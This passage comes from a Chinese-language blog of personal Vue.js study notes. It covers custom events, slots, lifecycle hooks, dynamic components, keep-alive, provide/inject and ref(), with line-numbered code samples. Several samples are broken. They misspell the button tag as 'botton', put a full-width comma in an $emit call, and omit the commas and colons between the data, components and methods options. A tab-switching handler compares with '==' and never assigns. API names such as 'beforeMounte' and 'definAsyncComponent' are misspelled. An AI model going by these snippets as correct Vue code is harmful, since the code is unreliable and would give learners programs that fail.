class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Child&lt;/h3&gt;</span><br><span class="line">&lt;botton @click=&quot;clickEventHandle&quot;&gt;传递数据&lt;/botton&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">    methods:&#123;</span><br><span class="line">        clickEventHandle()&#123;</span><br><span class="line">            //自定义事件</span><br><span class="line">           this.$emit(&quot;someEvent&quot;，&quot;Child数据&quot;)   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>./App.vue</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;ComponentEvent /&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import ComponentEvent from &quot;./components/ComponentEvent.vue&quot;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">    components:&#123;</span><br><span class="line">        ComponentEvent</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>总结：组件之间传递数据的方案</strong></p><ul><li>父传子：<code>props</code></li><li>子传父：<code>自定义事件 (this.$emit)</code></li></ul><h2 id="插槽Slots"><a href="#插槽Slots" class="headerlink" title="插槽Slots"></a>插槽Slots</h2><p>我们已经了解到组件能够接收任意类型的JavaScript值作为props，但组件要如何接收模板内容呢？在某些场景中，我们可能想要为子组  件传递一些模板片段，让子组件在L它们的组件中渲染这些片段。</p><p><code>./components/SlotsBase.vue</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;插槽基础知识&lt;/h3&gt;</span><br><span class="line">&lt;slot&gt;&lt;/slot&gt;    //固定的，直接把app.vue里面的div显示出来了</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p><code>./App.vue</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;SlotsBase&gt;   //单标签变成双标签</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;h3&gt;插槽标题&lt;/h3&gt;</span><br><span class="line">            &lt;p&gt;插槽内容&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/SlotsBase&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import SlotsBase from &quot;./components/SlotsBase.vue&quot;</span><br><span class="line">    export default &#123;</span><br><span class="line">        components:&#123;</span><br><span class="line">            SlotsBase</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;slot&gt;</code>元素是一个插槽出口(slot outlet)，标示了父元素提供的插槽内容(slot content)将在哪里被渲染 </p><h3 id="渲染作用域"><a href="#渲染作用域" class="headerlink" title="渲染作用域"></a>渲染作用域</h3><p>插槽内容可以访问到父组件的数据作用域，因为插槽内容本身是在父组件模板中定义的。</p><p><code>App.vue</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;SlotsBase&gt;  </span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;h3&gt;&#123;&#123; message &#125;&#125;&lt;/h3&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/SlotsBase&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import SlotsBase from &quot;./components/SlotsBase.vue&quot;</span><br><span class="line">    export default &#123;         </span><br><span class="line">        data() &#123;</span><br><span class="line">            return&#123;</span><br><span class="line">                message:&quot;message在父级&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        components:&#123;</span><br><span class="line">            SlotsBase</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><code>./components/SlotsBase.vue</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;插槽基础知识&lt;/h3&gt;</span><br><span class="line">&lt;slot&gt;&lt;/slot&gt;    //这下子级直接渲染出了父级的message</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="具名插槽"><a href="#具名插槽" class="headerlink" title="具名插槽"></a>具名插槽</h3><p><code>App.vue</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;SlotsBase&gt;  </span><br><span class="line">        &lt;template v-slot:header&gt;   //可以简写为#header</span><br><span class="line"> &lt;div&gt;</span><br><span class="line">                &lt;h3&gt;Header&lt;/h3&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">    &lt;template v-slot:main&gt;</span><br><span class="line"> &lt;div&gt;</span><br><span class="line">                &lt;h3&gt;Main&lt;/h3&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">   &lt;/SlotsBase&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import SlotsBase from &quot;./components/SlotsBase.vue&quot;</span><br><span class="line">    export default &#123;         </span><br><span class="line">        components:&#123;</span><br><span class="line">            SlotsBase</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><code>./components/SlotsBase.vue</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;h3&gt;插槽基础知识&lt;/h3&gt;</span><br><span class="line">    &lt;slot name=&quot;header&quot;&gt;&lt;/slot&gt;      </span><br><span class="line"> &lt;hr&gt;</span><br><span class="line">    &lt;slot name=&quot;main&quot;&gt;&lt;/slot&gt;    </span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><hr><p>在某些场景下插槽的内容可能想要同时使用父组件域内和子组件域内的数据。要做到这一点，我们需要一种方法来让子组件在渲染时将一部分数据提供给插槽。</p><p>具体做法就是先让子级将元素传递给父级，然后由父级进行插槽设计后一起再传递给子级进行渲染。</p><p><code>App.vue</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;SlotsBase&gt;  </span><br><span class="line">        &lt;template v-slot:header&gt;   //可以简写为#header</span><br><span class="line"> &lt;div&gt;</span><br><span class="line">                &lt;h3&gt;Header&lt;/h3&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">    &lt;template v-slot:main&gt;</span><br><span class="line"> &lt;div&gt;</span><br><span class="line">                &lt;h3&gt;Main&lt;/h3&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">   &lt;/SlotsBase&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import SlotsBase from &quot;./components/SlotsBase.vue&quot;</span><br><span class="line">    export default &#123;         </span><br><span class="line">        components:&#123;</span><br><span class="line">            SlotsBase</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><code>./components/SlotsBase.vue</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;template&gt;</span><br><span class="line">     &lt;h3&gt;插槽基础知识&lt;/h3&gt;</span><br><span class="line">     &lt;slot :msg=&quot;childMessage&quot;&gt;&lt;/slot&gt;      </span><br><span class="line"> &lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            childMessage:&quot;子组件数据&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="组件生命周期"><a href="#组件生命周期" class="headerlink" title="组件生命周期"></a>组件生命周期</h2><p>每个Vue组件实例在创建时都需要经历一系列的初始化步骤，比如设置好数据侦听，编译模块，挂载实例到DOM，以及在数据改变时更新DOM。在此过程中，它也会运行被称为生命周期钩子的函数，让开发者有机会在特定阶段运行自己的代码。</p><h3 id="生命周期函数"><a href="#生命周期函数" class="headerlink" title="生命周期函数"></a>生命周期函数</h3><ul><li>创建期：beforeCreate  created</li><li>挂载期：beforeMounte  mounted</li><li>更新期：beforeUpdate updated</li><li>销毁期：beforeUnmount  unmounted</li></ul><h3 id="生命周期应用"><a href="#生命周期应用" class="headerlink" title="生命周期应用"></a>生命周期应用</h3><p>组件的生命周期会随着我们队<code>Vue</code>的了解越多，夜壶越来越重要，先讲两个常见的应用</p><ul><li>通过<code>ref</code>获取DOM结构</li><li>模拟网络请求渲染数据</li></ul><h4 id="通过ref获取元素DOM结构"><a href="#通过ref获取元素DOM结构" class="headerlink" title="通过ref获取元素DOM结构"></a>通过<code>ref</code>获取元素DOM结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;template&gt;</span><br><span class="line">&lt;h3&gt;组件生命周期应用&lt;/h3&gt;</span><br><span class="line">&lt;p ref=&quot;name&quot;&gt;psych&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        mounted() &#123;</span><br><span class="line">            console.log(this.$refs.name);   //可以读到name那个p标签。因为已经mounted函数在p标签渲染之后执行，这个时候就能读到。</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="模拟网络请求渲染数据"><a href="#模拟网络请求渲染数据" class="headerlink" title="模拟网络请求渲染数据"></a>模拟网络请求渲染数据</h4><p> 就在created函数里面渲染获取的数据。具体和上面那个一样的。</p><h3 id="动态组件"><a href="#动态组件" class="headerlink" title="动态组件"></a>动态组件</h3><p>有些场景会需要在两个组件来回切换，比如<code>Tab</code>界面。</p><p><code>App.vue</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;component :is=&quot;tabComponent&quot;&gt;&lt;/component&gt;</span><br><span class="line">&lt;botton @click=&quot;changeHandle&quot;&gt;切换组件&lt;/botton&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import ComponentA from &quot;./components/ComponentA.vue&quot;</span><br><span class="line">import ComponentB from &quot;./components/ComponentB.vue&quot;    </span><br><span class="line">export default &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            tabComponent:&quot;ComponentA&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    components:&#123;</span><br><span class="line">        ComponentA,</span><br><span class="line">        ComponentB</span><br><span class="line">    &#125;</span><br><span class="line">    methods&#123;</span><br><span class="line">    changeHandle()&#123;</span><br><span class="line">        this.tabComponent == &quot;ComponentA&quot; ? &quot;ComponentB&quot; : &quot;ComponentA&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="组件保持存活"><a href="#组件保持存活" class="headerlink" title="组件保持存活"></a>组件保持存活</h3><p>当使用<code>&lt;component:is=&quot;··&quot;&gt;</code>在多个组件间切换时，被切换掉的组件会被卸载，我们可以通过<keep-alive>组件强制被切换掉的组件仍然保持”存活状态”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;keep-alive&gt;     //放在这个keep-alive组件里面就不会被卸载，这样之前更新过的数据就不会重新变成老数据，也就是不会执行销毁期的函数</span><br><span class="line">&lt;component :is=&quot;tabComponent&quot;&gt;&lt;/component&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br><span class="line"></span><br><span class="line">&lt;botton @click=&quot;changeHandle&quot;&gt;切换组件&lt;/botton&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import ComponentA from &quot;./components/ComponentA.vue&quot;</span><br><span class="line">import ComponentB from &quot;./components/ComponentB.vue&quot;    </span><br><span class="line">export default &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            tabComponent:&quot;ComponentA&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    components:&#123;</span><br><span class="line">        ComponentA,</span><br><span class="line">        ComponentB</span><br><span class="line">    &#125;</span><br><span class="line">    methods&#123;</span><br><span class="line">    changeHandle()&#123;</span><br><span class="line">        this.tabComponent == &quot;ComponentA&quot; ? &quot;ComponentB&quot; : &quot;ComponentA&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="异步组件"><a href="#异步组件" class="headerlink" title="异步组件"></a>异步组件</h3><p>在大型项目中，我们可能需要拆分应用为更小的块，并仅在需要时再从服务器加载相关组件。Vue提供了<code>definAsyncComponent</code>方法来实现此功能。目的是优化组件性能</p><h2 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h2><p>通常情况下，当我们需要从父组件向子组件传递数据时，会使用<code>props</code>。想象一下这样的结构：有一些多层级嵌套的组件，下你过程了一颗巨大的组件数，当某个深层的子组件需要一个较远的祖先组件中的部分数据。在这种情况下，如果仅使用props则必须将其沿着组件链逐级传递下去，这会非常麻烦。</p><p><code>Root--(props)--&gt;Footer--(props)--&gt;DeepChild</code></p><p>这一问题被称为”props逐级透传”</p><p><code>provide</code>和<code>inject</code>可以帮助我们解决这一问题。一个父组件相对于其所有的后代组件，会作为依赖提供者。任何后代的组件数，武罗层级有多深，都可以注入由父组件提供给整条链路的依赖。</p><p>要为组件后代提供数据，需要使用到<code>provide</code>选项，后代接收数据需要用到<code>inject</code>选项</p><h4 id="祖宗级："><a href="#祖宗级：" class="headerlink" title="祖宗级："></a>祖宗级：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">provide</span>: &#123;</span><br><span class="line">        <span class="attr">message</span>:<span class="string">&#x27;祖宗级数据&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//也可以是变量数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>也可以是变量数据</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="title function_">provide</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">message</span>:<span class="variable language_">this</span>.<span class="property">message</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="子级"><a href="#子级" class="headerlink" title="子级"></a>子级</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">inject</span>:[<span class="string">&quot;message&quot;</span>]    <span class="comment">//然后就读取到了上级的上级的数据。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li><code>provide</code>和<code>inject</code>只能由上到下的传递。</li><li>除了在一个组件中提供依赖，我们还可以在整个应用层面提供依赖。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line">app.<span class="title function_">provide</span>(<span class="comment">/* 注入名 */</span><span class="string">&#x27;message&#x27;</span>,<span class="comment">/* 值 */</span><span class="string">&#x27;hello!&#x27;</span>)</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Vue应用"><a href="#Vue应用" class="headerlink" title="Vue应用"></a>Vue应用</h2><h3 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//App:Vue的实例对象</span></span><br><span class="line"><span class="comment">//在一个Vue项目中，有且仅有有个Vue的实例对象</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><p>每个Vue应用都是通过<code>createApp</code>函数创建一个新的<strong>应用实例</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(&#123;</span><br><span class="line">    <span class="comment">/* 根组件选项 */</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="根组件"><a href="#根组件" class="headerlink" title="根组件"></a>根组件</h3><p>我们传入一个<code>createApp</code>的对象实际上是一个组件，每个应用都需要一个’根组件’，其他组件将作为其子组件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">//从一个单文件组件中导入根组件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span>   <span class="comment">//App就是根组件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)    <span class="comment">//挂载应用</span></span><br></pre></td></tr></table></figure><h3 id="挂载应用"><a href="#挂载应用" class="headerlink" title="挂载应用"></a>挂载应用</h3><p>应用实例必须在调用了<code>.mount()</code>方法后才会渲染出来。该方法接收一个”容器”参数，可以是一个实际的DOM元素或是一个CSS选择器字符串</p><p><code>app.mount(&#39;#app&#39;) </code>    -&gt;   这就是挂载应用</p><p><code>&lt;div id=&quot;app&quot;&gt;&lt;div&gt;</code>      -&gt;    <code>index.html</code>中真正的入口</p><h3 id="公共资源"><a href="#公共资源" class="headerlink" title="公共资源"></a>公共资源</h3><p>在<code>src</code>目录下的<code>assets</code>文件夹的作用就是存放公共资源，例如：图片、公共CSs或者字体图标等</p><h2 id="响应式"><a href="#响应式" class="headerlink" title="响应式"></a>响应式</h2><h3 id="声明响应式状态"><a href="#声明响应式状态" class="headerlink" title="声明响应式状态"></a>声明响应式状态</h3><h4 id="ref-1"><a href="#ref-1" class="headerlink" title="ref()"></a><code>ref()</code></h4><p>在组合式 API 中，推荐使用 <code>ref()</code> 函数来声明响应式状态：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><code>ref()</code> 接收参数，并将其包裹在一个带有 <code>.value</code> 属性的 ref 对象中返回：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(count) <span class="comment">// &#123; value: 0 &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(count.<span class="property">value</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">count.<span class="property">value</span>++</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(count.<span class="property">value</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>要在组件模板中访问 ref，请从组件的 <code>setup()</code> 函数中声明并返回它们：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="comment">// `setup` 是一个特殊的钩子，专门用于组合式 API。</span></span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 ref 暴露给模板</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      count</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title="&lt;script setup&gt;"></a><code>&lt;script setup&gt;</code></h4><p>在 <code>setup()</code> 函数中手动暴露大量的状态和方法非常繁琐。幸运的是，我们可以通过使用[单文件组件<code> SFC</code>来避免这种情况。我们可以使用 <code>&lt;script setup&gt;</code> 来大幅度地简化代码：</p><figure class="highlight plaintext"><table><tr><td 